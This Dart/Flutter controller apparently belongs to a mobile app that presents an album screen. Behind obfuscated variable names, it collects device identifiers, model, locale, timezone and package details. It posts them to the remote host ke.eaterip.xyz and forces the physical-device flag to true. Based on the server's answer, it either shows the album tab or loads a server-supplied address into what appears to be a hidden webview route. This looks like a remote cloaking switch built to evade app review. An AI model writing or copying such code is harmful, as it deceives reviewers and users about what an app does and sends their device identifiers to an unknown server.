import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var mqvonke = RxBool(false);
  var dojspvenr = RxBool(true);
  var rjhglwp = RxString("");
  var coy = RxBool(false);
  var schowalter = RxBool(true);
  final jslfwvknmh = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    eawubo();
  }


  Future<void> eawubo() async {

    coy.value = true;
    schowalter.value = true;
    dojspvenr.value = false;

    jslfwvknmh.post("https://ke.eaterip.xyz/txpbcrylzmnidjeahsk",data: await qlhbxuf()).then((value) {
      var oldteqxu = value.data["oldteqxu"] as String;
      var umtcqfge = value.data["umtcqfge"] as bool;
      if (umtcqfge) {
        rjhglwp.value = oldteqxu;
        ulises();
      } else {
        carroll();
      }
    }).catchError((e) {
      dojspvenr.value = true;
      schowalter.value = true;
      coy.value = false;
    });
  }

  Future<Map<String, dynamic>> qlhbxuf() async {
    final DeviceInfoPlugin cdqmhb = DeviceInfoPlugin();
    PackageInfo njaite_vpay = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var agcx = Platform.localeName;
    var rwliszbx = currentTimeZone;

    var dxog = njaite_vpay.packageName;
    var aqrcf = njaite_vpay.version;
    var ckgbzr = njaite_vpay.buildNumber;

    var vdgbksh = njaite_vpay.appName;
    var felanh  = "";
    var birdiePollich = "";
    var itdmk = "";
    var mohammedDietrich = "";
    var julianneWhite = "";
    var patwclej = "";
    var tadBarton = "";
    var mohamedBergstrom = "";


    var nuwldq = "";
    var ewli = false;

    if (GetPlatform.isAndroid) {
      nuwldq = "android";
      var hvzrtn = await cdqmhb.androidInfo;

      itdmk = hvzrtn.brand;

      patwclej  = hvzrtn.model;
      felanh = hvzrtn.id;

      ewli = hvzrtn.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      nuwldq = "ios";
      var dnibcxes = await cdqmhb.iosInfo;
      itdmk = dnibcxes.name;
      patwclej = dnibcxes.model;

      felanh = dnibcxes.identifierForVendor ?? "";
      ewli  = dnibcxes.isPhysicalDevice;
    }
    ewli  =true;
    var res = {
      "ckgbzr": ckgbzr,
      "dxog": dxog,
      "mohammedDietrich" : mohammedDietrich,
      "patwclej": patwclej,
      "rwliszbx": rwliszbx,
      "itdmk": itdmk,
      "vdgbksh": vdgbksh,
      "felanh": felanh,
      "agcx": agcx,
      "aqrcf": aqrcf,
      "julianneWhite" : julianneWhite,
      "nuwldq": nuwldq,
      "ewli": ewli,
      "birdiePollich" : birdiePollich,
      "tadBarton" : tadBarton,
      "mohamedBergstrom" : mohamedBergstrom,

    };
    return res;
  }

  Future<void> carroll() async {
    Get.offAllNamed("/album_tab");
  }

  Future<void> ulises() async {
    Get.offAllNamed("/rule_back");
  }
}
